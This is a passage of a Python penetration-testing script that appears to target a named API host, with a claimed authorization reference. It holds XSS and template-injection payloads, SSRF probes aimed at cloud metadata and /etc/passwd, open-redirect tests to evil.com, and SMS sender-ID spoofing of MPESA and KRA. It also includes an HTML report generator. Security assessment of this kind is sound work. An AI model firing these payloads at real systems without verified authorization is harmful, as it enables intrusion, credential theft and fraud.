    # Test SMS sender ID spoofing
    info("Testing sender ID spoofing...")
    for spoof in ["SAFARICOM", "MPESA", "KRA", "BANK", "ADMIN", "GOD"]:
        r = safe_post("/api/sms/send",
                      json={"phone": "+254700000000",
                            "message": "test",
                            "sender_id": spoof})
        if r and r.status_code in (200,201):
            finding("HIGH", f"Sender ID spoofing accepted: '{spoof}'",
                    f"Server allowed arbitrary sender ID '{spoof}'.", r.text[:200])

    ok("Logic flaw phase complete.")

# ─── PHASE 9: WEB VULNS (XSS/SSRF/HEADERS) ───────────────────────────────────────────────────────────────────
def phase_web():
    info("=" * 60)
    info("PHASE 9 — WEB VULNERABILITIES")
    info("=" * 60)

    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(document.domain)</script>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "${7*7}",  # template injection
        "{{7*7}}",  # SSTI
        "<%=7*7%>",
    ]

    ssrf_targets = [
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254",  # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal",
        "http://0.0.0.0",
        "file:///etc/passwd",
    ]

    # XSS in search/filter params
    info("Testing reflected XSS...")
    xss_params = ["q", "search", "name", "message", "phone", "filter", "callback"]
    for param in xss_params:
        for payload in xss_payloads[:3]:
            r = safe_get(f"/api/search?{param}={requests.utils.quote(payload)}")
            if r and payload in r.text:
                csp = r.headers.get("Content-Security-Policy","")
                if not csp or "unsafe-inline" in csp:
                    finding("HIGH","Reflected XSS",
                            f"Payload reflected at /api/search?{param}=...",
                            f"Payload: {payload}\nResponse: {r.text[:300]}")

    # SSRF via URL parameters
    info("Testing SSRF...")
    ssrf_params = ["url", "webhook", "callback", "redirect", "return_url",
                   "image_url", "logo_url", "target", "host"]
    for param in ssrf_params:
        for target in ssrf_targets[:3]:
            r = safe_get(f"/api/webhooks?{param}={requests.utils.quote(target)}")
            if r and r.status_code == 200:
                if "ami-id" in r.text or "instance-id" in r.text or "root:x" in r.text:
                    finding("CRITICAL","SSRF — Internal service access",
                            f"SSRF via {param}={target} returned internal data.",
                            r.text[:500])
            r2 = safe_post("/api/webhooks", json={param: target})
            if r2 and r2.status_code == 200:
                if "ami-id" in r2.text or "root:x" in r2.text:
                    finding("CRITICAL","SSRF — POST body SSRF",
                            f"SSRF via POST {param}={target}", r2.text[:500])

    # Open redirect
    info("Testing open redirect...")
    redirects = [
        "/logout?redirect=https://evil.com",
        "/login?next=https://evil.com",
        "/api/auth/logout?return_url=https://evil.com",
    ]
    for path in redirects:
        r = safe_get(path, allow_redirects=False)
        if r and r.status_code in (301,302,303,307,308):
            loc = r.headers.get("Location","")
            if "evil.com" in loc:
                finding("MEDIUM","Open Redirect",
                        f"Redirect to attacker-controlled URL via {path}",
                        f"Location: {loc}")

    # HTTP methods
    info("Testing HTTP method enumeration...")
    for method in ["TRACE","TRACK","PUT","DELETE","PATCH","OPTIONS"]:
        try:
            r = requests.request(method, url("/api/user"), timeout=TIMEOUT,
                                 headers=SESSION.headers)
            if r.status_code not in (404,405,501) and method in ("TRACE","TRACK"):
                finding("LOW",f"Dangerous HTTP method enabled: {method}",
                        f"{method} /api/user → {r.status_code}", r.text[:200])
        except:
            pass

    ok("Web vuln phase complete.")

# ─── REPORT GENERATION ────────────────────────────────────────────────────────────────────────────────────────
def generate_report():
    info("=" * 60)
    info("GENERATING REPORT")
    info("=" * 60)

    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sorted_findings = sorted(FINDINGS, key=lambda f: sev_order.get(f["severity"],5))

    counts = {s:0 for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]}
    for f in FINDINGS:
        counts[f["severity"]] = counts.get(f["severity"],0) + 1

    sev_colors = {
        "CRITICAL": "#ff2d2d",
        "HIGH":     "#ff6b35",
        "MEDIUM":   "#ffd700",
        "LOW":      "#4fc3f7",
        "INFO":     "#b0bec5",
    }

    rows = ""
    for f in sorted_findings:
        color = sev_colors.get(f["severity"],"#ccc")
        ev = f["evidence"].replace("<","&lt;").replace(">","&gt;") if f["evidence"] else ""
        rows += f"""
        <tr>
          <td><span class="badge" style="background:{color}">{f['severity']}</span></td>
          <td><strong>{f['title']}</strong><br><small>{f['detail']}</small></td>
          <td><pre class="evidence">{ev[:600]}</pre></td>
          <td>{f['time'][11:19]}</td>
        </tr>"""

    recon_403 = "<br>".join(RECON.get("403_paths",[]) or ["None"])
    api_found = ""
    for ep in RECON.get("api_endpoints",[]):
        api_found += f"<tr><td>{ep['path']}</td><td>{ep['status']}</td><td>{ep['length']}b</td></tr>"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Assessment Report — api.onfonmedia.co.ke</title>
<style>
  :root {{
    --bg:#0d1117; --card:#161b22; --border:#30363d;
    --text:#e6edf3; --muted:#8b949e; --accent:#00ff9f;
  }}
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  body {{ background:var(--bg); color:var(--text); font-family:'Segoe UI',sans-serif; padding:2rem; }}
  h1 {{ color:var(--accent); font-size:1.8rem; margin-bottom:.3rem; }}
  .meta {{ color:var(--muted); font-size:.85rem; margin-bottom:2rem; }}
  .grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:1rem; margin-bottom:2rem; }}
  .stat {{ background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1rem; text-align:center; }}
  .stat .num {{ font-size:2rem; font-weight:700; }}
  .stat .lbl {{ font-size:.8rem; color:var(--muted); text-transform:uppercase; }}
  .section {{ background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1.5rem; margin-bottom:2rem; }}
  .section h2 {{ color:var(--accent); margin-bottom:1rem; font-size:1.1rem; border-bottom:1px solid var(--border); padding-bottom:.5rem; }}
  table {{ width:100%; border-collapse:collapse; font-size:.9rem; }}
  th {{ text-align:left; padding:.6rem; border-bottom:1px solid var(--border); color:var(--muted); font-weight:600; }}
  td {{ padding:.7rem .6rem; border-bottom:1px solid var(--border); vertical-align:top; }}
  tr:hover td {{ background:rgba(0,255,159,.04); }}
  .badge {{ padding:.2rem .6rem; border-radius:4px; font-size:.75rem; font-weight:700; color:#000; }}
  pre.evidence {{ background:#0a0c10; padding:.6rem; border-radius:4px; font-size:.75rem; overflow-x:auto; white-space:pre-wrap; word-break:break-all; color:#79c0ff; max-height:120px; overflow-y:auto; }}
  .recon {{ font-size:.85rem; color:var(--muted); }}
  .recon strong {{ color:var(--text); }}
  footer {{ text-align:center; color:var(--muted); font-size:.8rem; margin-top:2rem; }}
</style>
</head>
<body>
<h1>Security Assessment Report</h1>
<p class="meta">
  Target: <strong>api.onfonmedia.co.ke</strong> &nbsp;|&nbsp;
  Engagement: <strong>Cyberdeck Consultants</strong> &nbsp;|&nbsp;
  LOA Ref: <strong>api.onfonmedia.co.ke/CTO/LOA/2026/012</strong> &nbsp;|&nbsp;
  Date: <strong>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</strong>
</p>

<div class="grid">
  <div class="stat"><div class="num" style="color:#ff2d2d">{counts['CRITICAL']}</div><div class="lbl">Critical</div></div>
  <div class="stat"><div class="num" style="color:#ff6b35">{counts['HIGH']}</div><div class="lbl">High</div></div>
  <div class="stat"><div class="num" style="color:#ffd700">{counts['MEDIUM']}</div><div class="lbl">Medium</div></div>
  <div class="stat"><div class="num" style="color:#4fc3f7">{counts['LOW']}</div><div class="lbl">Low</div></div>
  <div class="stat"><div class="num" style="color:var(--accent)">{len(FINDINGS)}</div><div class="lbl">Total</div></div>
</div>

<div class="section">
  <h2>Reconnaissance Summary</h2>
  <div class="recon">
    <p><strong>403 Paths (may exist):</strong> {recon_403}</p>
    <br>
    <p><strong>Discovered API Endpoints:</strong></p>
    <table style="margin-top:.5rem">
      <tr><th>Path</th><th>Status</th><th>Size</th></tr>
      {api_found if api_found else "<tr><td colspan=3>None discovered unauthenticated</td></tr>"}
    </table>
  </div>
</div>

<div class="section">
  <h2>Findings ({len(FINDINGS)} total)</h2>
  <table>
    <thead><tr><th>Severity</th><th>Finding</th><th>Evidence</th><th>Time</th></tr></thead>
    <tbody>
      {rows if rows else "<tr><td colspan=4 style='text-align:center;color:#8b949e'>No findings recorded</td></tr>"}
    </tbody>
  </table>
</div>

<div class="section">
  <h2>Recommendations</h2>
  <table>
    <thead><tr><th>Priority</th><th>Action</th></tr></thead>
    <tbody>
      <tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Remove or restrict access to all .env files and .git directory at web root</td></tr>
      <tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Implement server-side file type validation — reject PHP/executable uploads server-side, not just client-side</td></tr>
      <tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Add missing security headers: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, CSP</td></tr>
      <tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Implement per-user rate limiting on all authentication endpoints</td></tr>
      <tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Audit all API endpoints for object-level authorization (IDOR)</td></tr>
      <tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Validate all numeric parameters server-side — reject negative values in financial operations</td></tr>
      <tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Restrict CORS to known origins only</td></tr>
      <tr><td><span class="badge" style="background:#4fc3f7">LOW</span></td><td>Audit sender ID whitelist — prevent spoofing of regulated identifiers (MPESA, SAFARICOM, KRA)</td></tr>
    </tbody>
  </table>
</div>

<footer>
  CONFIDENTIAL — Authorized Security Assessment | Cyberdeck Consultants × api.onfonmedia.co.ke<br>
  Generated by automated sweep — all findings require manual verification before disclosure
</footer>
</body>
</html>"""

    with open(REPORT_OUT, "w") as f:
        f.write(html)
    ok(f"Report written to: {REPORT_OUT}")
    return html

# ─── MAIN ───────────────────────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\033[92m")
    print("=" * 60)
    print("  ONEFONE SECURITY ASSESSMENT")
    print("  Target: api.onfonmedia.co.ke")
    print("  Cyberdeck Consultants | LOA/2026/012")
    print("=" * 60)
    print("\033[0m")

    phase_recon()
    auth_ok = phase_auth()
    phase_surface_map()
    phase_sqli()
    phase_file_upload()
    phase_idor()
    phase_credentials()
    phase_logic()
    phase_web()
    generate_report()

    print("\n\033[92m" + "=" * 60)
    print(f"  SWEEP COMPLETE — {len(FINDINGS)} findings")
    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    for f in sorted(FINDINGS, key=lambda x: sev_order.get(x["severity"],5)):
        c = {"CRITICAL":"\033[91m","HIGH":"\033[91m","MEDIUM":"\033[93m"}.get(f["severity"],"\033[0m")
        print(f"  {c}[{f['severity']}]\033[0m {f['title']}")
    print(f"\n  Report: {REPORT_OUT}")
    print("=" * 60 + "\033[0m")
